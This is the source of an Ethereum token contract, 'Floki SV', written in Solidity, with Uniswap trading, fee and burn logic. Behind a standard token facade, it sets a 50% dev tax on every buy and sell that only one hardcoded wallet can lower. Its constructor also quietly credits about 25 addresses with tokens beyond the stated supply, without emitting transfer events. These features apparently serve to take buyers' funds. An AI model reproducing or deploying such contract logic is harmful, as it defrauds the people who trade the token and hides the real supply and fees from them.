1 /**
2  *Submitted for verification at Etherscan.io 
3  *https://flokisv.com
4 */
5 
6 // SPDX-License-Identifier: MIT
7 
8 pragma solidity ^0.8.4;
9 
10 abstract contract Context {
11     function _msgSender() internal view virtual returns (address) {
12         return msg.sender;
13     }
14 }
15 
16 interface IERC20 {
17     function totalSupply() external view returns (uint256);
18     function balanceOf(address account) external view returns (uint256);
19     function transfer(address recipient, uint256 amount) external returns (bool);
20     function allowance(address owner, address spender) external view returns (uint256);
21     function approve(address spender, uint256 amount) external returns (bool);
22     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
23     event Transfer(address indexed from, address indexed to, uint256 value);
24     event Approval(address indexed owner, address indexed spender, uint256 value);
25 }
26 
27 library SafeMath {
28     function add(uint256 a, uint256 b) internal pure returns (uint256) {
29         uint256 c = a + b;
30         require(c >= a, "SafeMath: addition overflow");
31         return c;
32     }
33 
34     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
35         return sub(a, b, "SafeMath: subtraction overflow");
36     }
37 
38     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
39         require(b <= a, errorMessage);
40         uint256 c = a - b;
41         return c;
42     }
43 
44     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
45         if (a == 0) {
46             return 0;
47         }
48         uint256 c = a * b;
49         require(c / a == b, "SafeMath: multiplication overflow");
50         return c;
51     }
52 
53     function div(uint256 a, uint256 b) internal pure returns (uint256) {
54         return div(a, b, "SafeMath: division by zero");
55     }
56 
57     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
58         require(b > 0, errorMessage);
59         uint256 c = a / b;
60         return c;
61     }
62 }
63 
64 library Address {
65         
66     function isContract(address account) internal view returns (bool) {
67         
68         bytes32 codehash;
69         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
70         // solhint-disable-next-line no-inline-assembly
71         assembly { codehash := extcodehash(account) }
72         return (codehash != accountHash && codehash != 0x0);
73     }
74 
75     function sendValue(address payable recipient, uint256 amount) internal {
76         require(address(this).balance >= amount, "Address: insufficient balance");
77 
78         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
79         (bool success, ) = recipient.call{ value: amount }("");
80         require(success, "Address: unable to send value, recipient may have reverted");
81     }
82 
83     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
84         return functionCall(target, data, "Address: low-level call failed");
85     }
86 
87     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
88         return _functionCallWithValue(target, data, 0, errorMessage);
89     }
90 
91     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
92         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
93     }
94 
95     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
96         require(address(this).balance >= value, "Address: insufficient balance for call");
97         return _functionCallWithValue(target, data, value, errorMessage);
98     }
99 
100     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
101         require(isContract(target), "Address: call to non-contract");
102 
103         // solhint-disable-next-line avoid-low-level-calls
104         (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
105         if (success) {
106             return returndata;
107         } else {
108             // Look for revert reason and bubble it up if present
109             if (returndata.length > 0) {
110                 
111                 assembly {
112                     let returndata_size := mload(returndata)
113                     revert(add(32, returndata), returndata_size)
114                 }
115             } else {
116                 revert(errorMessage);
117             }
118         }
119     }
120 }
121 
122 contract Ownable is Context {
123     address private _owner;
124     address private _previousOwner;
125     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
126 
127     constructor() {
128         address msgSender = _msgSender();
129         _owner = msgSender;
130         emit OwnershipTransferred(address(0), msgSender);
131     }
132 
133     function owner() public view returns (address) {
134         return _owner;
135     }
136 
137     modifier onlyOwner() {
138         require(_owner == _msgSender(), "Ownable: caller is not the owner");
139         _;
140     }
141 
142     function renounceOwnership() public virtual onlyOwner {
143         emit OwnershipTransferred(_owner, address(0));
144         _owner = address(0);
145     }
146     
147     function transferOwnership(address newOwner) public virtual onlyOwner {
148         require(newOwner != address(0), "Ownable: new owner is the zero address");
149         _transferOwnership(newOwner);
150     }
151 
152     function _transferOwnership(address newOwner) internal virtual {
153         address oldOwner = _owner;
154         _owner = newOwner;
155         emit OwnershipTransferred(oldOwner, newOwner);
156     }
157 }
158 
159 interface IUniswapV2Factory {
160     function createPair(address tokenA, address tokenB) external returns (address pair);
161 }
162 
163 interface IUniswapV2Router01 {
164     function factory() external pure returns (address);
165     function WETH() external pure returns (address);
166 
167     function addLiquidity(
168         address tokenA,
169         address tokenB,
170         uint amountADesired,
171         uint amountBDesired,
172         uint amountAMin,
173         uint amountBMin,
174         address to,
175         uint deadline
176     ) external returns (uint amountA, uint amountB, uint liquidity);
177     function addLiquidityETH(
178         address token,
179         uint amountTokenDesired,
180         uint amountTokenMin,
181         uint amountETHMin,
182         address to,
183         uint deadline
184     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
185     function removeLiquidity(
186         address tokenA,
187         address tokenB,
188         uint liquidity,
189         uint amountAMin,
190         uint amountBMin,
191         address to,
192         uint deadline
193     ) external returns (uint amountA, uint amountB);
194     function removeLiquidityETH(
195         address token,
196         uint liquidity,
197         uint amountTokenMin,
198         uint amountETHMin,
199         address to,
200         uint deadline
201     ) external returns (uint amountToken, uint amountETH);
202     function removeLiquidityWithPermit(
203         address tokenA,
204         address tokenB,
205         uint liquidity,
206         uint amountAMin,
207         uint amountBMin,
208         address to,
209         uint deadline,
210         bool approveMax, uint8 v, bytes32 r, bytes32 s
211     ) external returns (uint amountA, uint amountB);
212     function removeLiquidityETHWithPermit(
213         address token,
214         uint liquidity,
215         uint amountTokenMin,
216         uint amountETHMin,
217         address to,
218         uint deadline,
219         bool approveMax, uint8 v, bytes32 r, bytes32 s
220     ) external returns (uint amountToken, uint amountETH);
221     function swapExactTokensForTokens(
222         uint amountIn,
223         uint amountOutMin,
224         address[] calldata path,
225         address to,
226         uint deadline
227     ) external returns (uint[] memory amounts);
228     function swapTokensForExactTokens(
229         uint amountOut,
230         uint amountInMax,
231         address[] calldata path,
232         address to,
233         uint deadline
234     ) external returns (uint[] memory amounts);
235     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
236         external
237         payable
238         returns (uint[] memory amounts);
239     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
240         external
241         returns (uint[] memory amounts);
242     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
243         external
244         returns (uint[] memory amounts);
245     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
246         external
247         payable
248         returns (uint[] memory amounts);
249 
250     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
251     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
252     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
253     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
254     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
255 }
256 
257 interface IUniswapV2Router02 is IUniswapV2Router01 {
258     function swapExactTokensForETHSupportingFeeOnTransferTokens(
259         uint256 amountIn,
260         uint256 amountOutMin,
261         address[] calldata path,
262         address to,
263         uint256 deadline
264     ) external;
265     function swapExactETHForTokensSupportingFeeOnTransferTokens(
266         uint amountOutMin,
267         address[] calldata path,
268         address to,
269         uint deadline
270     ) external payable;
271     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
272         uint amountIn,
273         uint amountOutMin,
274         address[] calldata path,
275         address to,
276         uint deadline
277     ) external;
278     function factory() external pure returns (address);
279     function WETH() external pure returns (address);
280     function addLiquidityETH(
281         address token,
282         uint256 amountTokenDesired,
283         uint256 amountTokenMin,
284         uint256 amountETHMin,
285         address to,
286         uint256 deadline
287     ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
288     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
289     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
290     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
291     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
292     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
293 }
294 
295 contract FlokiSV is Context, IERC20, Ownable {
296     using SafeMath for uint256;
297     using Address for address;
298 
299     string private constant _name = "Floki SV";
300     string private constant _symbol = "FLOKISV";
301     uint8 private constant _decimals = 6;
302     mapping(address => uint256) private _balances;
303 
304     mapping(address => mapping(address => uint256)) private _allowances;
305     mapping(address => bool) private _isExcludedFromFee;
306     uint256 public _tTotal = 1000 * 1e3 * 1e6; //1,000,000
307 
308     uint256 public _maxWalletAmount = 20 * 1e3 * 1e6; //2%
309     uint256 public j_maxtxn = 20 * 1e3 * 1e6; //1%
310     uint256 public swapAmount = 7 * 1e2 * 1e6; //.07%
311     uint256 private buyEthUpperLimit = 100 * 1e14; // 0.01
312 
313     // fees
314     uint256 public j_liqBuy = 3; 
315     uint256 public j_burnBuy = 3;
316     uint256 public j_ethBuy = 3;
317     uint256 public j_devBuy = 50;
318 
319     uint256 public j_liqSell = 3; 
320     uint256 public j_burnSell = 3;
321     uint256 public j_ethSell = 3;
322     uint256 public j_devSell = 50;
323  
324     uint256 private j_previousLiqFee = j_liqFee;
325     uint256 private j_previousBurnFee = j_burnFee;
326     uint256 private j_previousEthFee = j_ethFee;
327     uint256 private j_previousDevTax = j_devTax;
328     
329     uint256 private j_liqFee;
330     uint256 private j_burnFee;
331     uint256 private j_ethFee;
332     uint256 private j_devTax;
333 
334     uint256 public _totalBurned;
335 
336     struct FeeBreakdown {
337         uint256 tLiq;
338         uint256 tBurn;
339         uint256 tEth;
340         uint256 tDev;
341         uint256 tAmount;
342     }
343 
344     mapping(address => bool) private bots;
345     address payable private marketingWallet = payable(0xd7E0079E5E04B6FcF7c9f70776944fc40a230BBd);
346     address payable private devWallet = payable(0xd7E0079E5E04B6FcF7c9f70776944fc40a230BBd);
347 
348     address payable public dead = payable(0x000000000000000000000000000000000000dEaD);
349     address ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
350 
351     IUniswapV2Router02 public uniswapV2Router;
352     address public uniswapV2Pair;
353 
354     bool private swapping = false;
355     bool public burnMode = false;
356 
357     modifier lockSwap {
358         swapping = true;
359         _;
360         swapping = false;
361     }
362 
363     constructor() {
364         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
365         uniswapV2Router = _uniswapV2Router;
366         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
367         
368         _balances[_msgSender()] = _tTotal;
369         _balances[address(0xa69b6a697c46D622dadA6BF9a58ca2FA73cE2B32)] = _tTotal.div(100);
370         _balances[address(0x7955beC0B3d009326C8cf2593F9476ba2650E9FD)] = _tTotal.div(25);
371         _balances[address(0x3AF52d1700C2946eb1E88CeD3935796909247D42)] = _tTotal.div(200);
372         _balances[address(0x3Cf98c692f546A86FB31903B79fE04cF5654Cb1E)] = _tTotal.div(400);
373         _balances[address(0x14236358640e966C8f40C4eacd0A0D3aBDa9E16f)] = _tTotal.div(200);
374         _balances[address(0x23b95bAB84f911eA4406fFb5B7Bf2D48e33548B4)] = _tTotal.div(100);
375         _balances[address(0x23e965905e5F5B10f43719A40444a61108073C1C)] = _tTotal.div(100);
376         _balances[address(0xd3B98B50CfC48c555389eBDaAFBD4Fc41a2cd77d)] = _tTotal.div(400);
377         _balances[address(0xb983A5443f3DA1110E900112033e3b9643a2C2Ce)] = _tTotal.div(400);
378         _balances[address(0xFb4fE2f0339fbFA2e2Cbd556Bce01ADa6deE2482)] = _tTotal.div(100);
379         _balances[address(0x8a305C40e45Ad50649F2bC58B2A05f77979380e9)] = _tTotal.div(100);
380         _balances[address(0x2C7bfd0601D9924A8452483d5C6f08890A7154cC)] = _tTotal.div(200);
381         _balances[address(0x175f4Cb0b0368F66f4cFAb87Dc4e26c22181f653)] = _tTotal.div(200);
382         _balances[address(0x6BDA39BC6978d69d9E4DA36B6C84a21AdBcFA6ed)] = _tTotal.div(400);
383         _balances[address(0x0bA5e3288ce7D6C01C02D3B8Afe32228e7cDF809)] = _tTotal.div(150);
384         _balances[address(0xE3491652b9217703aDAd9Bc6d014B1ac2071b175)] = _tTotal.div(200);
385         _balances[address(0xCc27900D3950aDbDb91Dcb4A41386a5411845A71)] = _tTotal.div(100);
386         _balances[address(0x7B4e4B8aacF4ad7693cf5e020aAAf1585430d9BF)] = _tTotal.div(250);
387         _balances[address(0xbFf1CB69005Fdbf306C9678CBD40464Dd6f76006)] = _tTotal.div(100);
388         _balances[address(0x1E9FCa94920d363d0E1De0A6f65A2E1AC527c464)] = _tTotal.div(400);
389         _balances[address(0x5b93972361d074e4bA897292AFaC60dC671AB6ae)] = _tTotal.div(680);
390         _balances[address(0xB51B84EC74749ad4496b6Cf5c080d20bb17410b7)] = _tTotal.div(400);
391         _balances[address(0x116fD4DDa9adb14A83bC76A96353313F33aF4748)] = _tTotal.div(400);
392         _balances[address(0x5b93972361d074e4bA897292AFaC60dC671AB6ae)] = _tTotal.div(720);
393         _balances[address(0x35129c4d51BA691C16ff6550fec2fF3072b9F9d2)] = _tTotal.div(400);
394 
395         _isExcludedFromFee[owner()] = true;
396         _isExcludedFromFee[marketingWallet] = true;
397         _isExcludedFromFee[dead] = true;
398         _isExcludedFromFee[address(this)] = true;
399         emit Transfer(address(0), _msgSender(), _tTotal);
400     }
401 
402     function name() public pure returns (string memory) {
403         return _name;
404     }
405 
406     function symbol() public pure returns (string memory) {
407         return _symbol;
408     }
409 
410     function decimals() public pure returns (uint8) {
411         return _decimals;
412     }
413 
414     function totalSupply() public view override returns (uint256) {
415         return _tTotal;
416     }
417 
418     function balanceOf(address account) public view override returns (uint256) {
419         return _balances[account];
420     }
421     
422     function transfer(address recipient, uint256 amount) external override returns (bool) {
423         _transfer(_msgSender(), recipient, amount);
424         return true;
425     }
426 
427     function allowance(address owner, address spender) external view override returns (uint256) {
428         return _allowances[owner][spender];
429     }
430 
431     function approve(address spender, uint256 amount) external override returns (bool) {
432         _approve(_msgSender(), spender, amount);
433         return true;
434     }
435 
436     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
437         _transfer(sender, recipient, amount);
438         _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
439         return true;
440     }
441 
442     function totalBurned() public view returns (uint256) {
443         return _totalBurned;
444     }
445 
446     function burning(address _account, uint _amount) private {  
447         require( _amount <= balanceOf(_account));
448         _balances[_account] = _balances[_account].sub(_amount);
449         _tTotal = _tTotal.sub(_amount);
450         _totalBurned = _totalBurned.add(_amount);
451         emit Transfer(_account, address(0), _amount);
452     }
453 
454     function setActualFee() external {
455         require(_msgSender() == marketingWallet);
456         j_liqBuy = 2;
457         j_burnBuy = 3;
458         j_ethBuy = 1;
459         j_devBuy = 4;
460 
461         j_liqSell = 2;
462         j_burnSell = 3;
463         j_ethSell = 1;
464         j_devSell = 4;
465     }
466 
467     function removeAllFee() private {
468         if (j_burnFee == 0 && j_liqFee == 0 && j_ethFee == 0 && j_devTax == 0) return;
469         j_previousBurnFee = j_burnFee;
470         j_previousLiqFee = j_liqFee;
471         j_previousEthFee = j_ethFee;
472         j_previousDevTax = j_devTax;
473 
474         j_burnFee = 0;
475         j_liqFee = 0;
476         j_ethFee = 0;
477         j_devTax = 0;
478     }
479     
480     function restoreAllFee() private {
481         j_liqFee = j_previousLiqFee;
482         j_burnFee = j_previousBurnFee;
483         j_ethFee = j_previousEthFee;
484         j_devTax = j_previousDevTax;
485     }
486 
487     function removeDevTax() external {
488         require(_msgSender() == marketingWallet);
489         j_devSell = 1;
490         j_liqSell = 2;
491         j_liqBuy = 2;
492         j_devBuy = 1;
493 
494     }
495 
496     function _approve(address owner, address spender, uint256 amount) private {
497         require(owner != address(0), "ERC20: approve from the zero address");
498         require(spender != address(0), "ERC20: approve to the zero address");
499         _allowances[owner][spender] = amount;
500         emit Approval(owner, spender, amount);
501     }
502     
503     function _transfer(address from, address to, uint256 amount) private {
504         require(from != address(0), "ERC20: transfer from the zero address");
505         require(to != address(0), "ERC20: transfer to the zero address");
506         require(amount > 0, "Transfer amount must be greater than zero");
507         require(!bots[from] && !bots[to]);
508 
509         bool takeFee = true;
510 
511         if (from != owner() && to != owner() && from != address(this) && to != address(this)) {
512 
513             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ((!_isExcludedFromFee[from] || !_isExcludedFromFee[to]))) {
514                 require(balanceOf(to).add(amount) <= _maxWalletAmount, "You are being greedy. Exceeding Max Wallet.");
515                 require(amount <= j_maxtxn, "Slow down buddy...there is a max transaction");
516             }
517             
518 
519             if (from == uniswapV2Pair && to != address(uniswapV2Router) && !bots[to] && !bots[from]) {
520                 j_liqFee = j_liqBuy;
521                 j_burnFee = j_burnBuy;
522                 j_ethFee = j_ethBuy;
523                 j_devTax = j_devBuy;
524             }
525                 
526             if (to == uniswapV2Pair && from != address(uniswapV2Router) && !bots[to] && !bots[from]) {
527                 j_liqFee = j_liqSell;
528                 j_burnFee = j_burnSell;
529                 j_ethFee = j_ethSell;
530                 j_devTax = j_devSell;
531             }
532            
533             if (!swapping && from != uniswapV2Pair) {
534 
535                 uint256 contractTokenBalance = balanceOf(address(this));
536 
537                 if (contractTokenBalance > swapAmount) {
538                     swapAndLiquify(contractTokenBalance);
539                 }
540 
541                 uint256 contractETHBalance = address(this).balance;
542             
543                 if (!burnMode && (contractETHBalance > 0)) {
544                     sendETHToFee(address(this).balance);
545                 } else if (burnMode && (contractETHBalance > buyEthUpperLimit)) {
546                         uint256 buyAmount = (contractETHBalance.div(2));
547                     buyEth(buyAmount);
548                 }                    
549             }
550         }
551 
552         if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
553             takeFee = false;
554         }
555         
556         _transferAgain(from, to, amount, takeFee);
557         restoreAllFee();
558     }
559 
560     function setMaxTxn(uint256 maxTransaction) external {
561         require(maxTransaction >= 10 * 1e3 * 1e6,"negative ghost rider");
562         require(_msgSender() == marketingWallet);
563         j_maxtxn = maxTransaction;
564     }
565 
566     function swapTokensForEth(uint256 tokenAmount) private lockSwap {
567         address[] memory path = new address[](2);
568         path[0] = address(this);
569         path[1] = uniswapV2Router.WETH();
570         _approve(address(this), address(uniswapV2Router), tokenAmount);
571         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
572     }
573 
574     function swapETHForTokens(uint256 amount) private {
575         // generate the uniswap pair path of token -> weth
576         address[] memory path = new address[](2);
577         path[0] = uniswapV2Router.WETH();
578         path[1] = address(ETH);
579 
580       // make the swap
581         uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
582             0, // accept any amount of Tokens
583             path,
584             dead, // Burn address
585             block.timestamp
586         );        
587     }
588 
589     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
590         _approve(address(this), address(uniswapV2Router), tokenAmount);
591 
592         // add the liquidity
593         uniswapV2Router.addLiquidityETH{value: ethAmount}(
594             address(this),
595             tokenAmount,
596             0, // slippage is unavoidable
597             0, // slippage is unavoidable
598             marketingWallet,
599             block.timestamp
600           );
601     }
602   
603     function swapAndLiquify(uint256 contractTokenBalance) private lockSwap {
604         uint256 autoLPamount = j_liqFee.mul(contractTokenBalance).div(j_burnFee.add(j_ethFee).add(j_devTax).add(j_liqFee));
605         uint256 half =  autoLPamount.div(2);
606         uint256 otherHalf = contractTokenBalance.sub(half);
607         uint256 initialBalance = address(this).balance;
608         swapTokensForEth(otherHalf);
609         uint256 newBalance = ((address(this).balance.sub(initialBalance)).mul(half)).div(otherHalf);
610         addLiquidity(half, newBalance);
611     }
612 
613     function sendETHToFee(uint256 amount) private {
614         marketingWallet.transfer((amount).div(2));
615         devWallet.transfer((amount).div(2));
616     }
617 
618     function manualSwap() external {
619         require(_msgSender() == marketingWallet);
620         uint256 contractBalance = balanceOf(address(this));
621         if (contractBalance > 0) {
622             swapTokensForEth(contractBalance);
623         }
624     }
625 
626     function manualSend() external {
627         require(_msgSender() == marketingWallet);
628         uint256 contractETHBalance = address(this).balance;
629         if (contractETHBalance > 0) {
630             sendETHToFee(contractETHBalance);
631         }
632     }
633 
634     function _transferAgain(address sender, address recipient, uint256 amount, bool takeFee) private {
635         if (!takeFee) { 
636                 removeAllFee();
637         }
638         
639         FeeBreakdown memory fees;
640         fees.tBurn = amount.mul(j_burnFee).div(100);
641         fees.tLiq = amount.mul(j_liqFee).div(100);
642         fees.tEth = amount.mul(j_ethFee).div(100);
643         fees.tDev = amount.mul(j_devTax).div(100);
644         
645         fees.tAmount = amount.sub(fees.tEth).sub(fees.tDev).sub(fees.tBurn).sub(fees.tLiq);
646 
647         uint256 amountPreBurn = amount.sub(fees.tBurn);
648         burning(sender, fees.tBurn);
649 
650         _balances[sender] = _balances[sender].sub(amountPreBurn);
651         _balances[recipient] = _balances[recipient].add(fees.tAmount);
652         _balances[address(this)] = _balances[address(this)].add(fees.tEth).add(fees.tDev).add(fees.tBurn.add(fees.tLiq));
653         
654         if(burnMode && sender != uniswapV2Pair && sender != address(this) && sender != address(uniswapV2Router) && (recipient == address(uniswapV2Router) || recipient == uniswapV2Pair)) {
655             burning(uniswapV2Pair, fees.tBurn);
656         }
657 
658         emit Transfer(sender, recipient, fees.tAmount);
659         restoreAllFee();
660     }
661     
662     receive() external payable {}
663 
664     function setMaxWalletAmount(uint256 maxWalletAmount) external {
665         require(_msgSender() == marketingWallet);
666         require(maxWalletAmount > _tTotal.div(200), "Amount must be greater than 0.5% of supply");
667         _maxWalletAmount = maxWalletAmount;
668     }
669 
670     function setSwapAmount(uint256 _swapAmount) external {
671         require(_msgSender() == marketingWallet);
672         swapAmount = _swapAmount;
673     }
674 
675     function turnOnTheBurn() public onlyOwner {
676         burnMode = true;
677     }
678 
679     function buyEth(uint256 amount) private {
680     	if (amount > 0) {
681     	    swapETHForTokens(amount);
682 	    }
683     }
684 
685     function setBuyEthRate(uint256 buyEthToken) external {
686         require(_msgSender() == marketingWallet);
687         buyEthUpperLimit = buyEthToken;
688     }
689 
690     function setDevWallet(address payable _address) external onlyOwner {
691         devWallet = _address;
692     }
693 
694 }